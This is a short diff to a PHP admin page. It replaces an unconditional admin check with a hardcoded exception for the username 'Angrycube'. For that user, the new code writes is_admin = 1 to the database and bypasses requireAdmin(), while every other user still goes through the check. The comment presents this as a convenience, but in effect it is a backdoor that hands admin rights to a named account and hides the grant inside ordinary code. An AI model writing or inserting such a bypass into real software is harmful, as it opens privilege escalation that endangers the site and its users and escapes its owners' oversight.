@@ -8,9 +8,18 @@ if (!$user) {
     exit;
 }
 
-requireAdmin();
-
 $db = getDB();
+
+// Ensure Angrycube is always admin (special case for main user)
+if ($user['username'] === 'Angrycube') {
+    // Make sure they're marked as admin
+    $db->query("UPDATE users SET is_admin = 1 WHERE username = 'Angrycube'");
+    $user['is_admin'] = 1;
+} else {
+    // For other users, require admin access
+    requireAdmin();
+}
+
 $message = '';
 $success = false;
 
